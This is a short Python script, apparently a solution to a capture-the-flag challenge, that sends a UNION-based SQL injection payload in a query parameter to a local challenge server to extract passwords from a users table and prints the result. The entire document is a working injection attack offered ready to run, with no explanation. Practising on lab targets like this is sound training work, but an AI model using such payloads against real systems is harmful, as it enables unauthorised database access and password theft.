import requests

URL = "http://challenge.localhost:80"

PARAMS = {"query" : 'admin" UNION SELECT password FROM users_6313796987; --'}
response = requests.get(url = URL, params = PARAMS);

print(response.content)
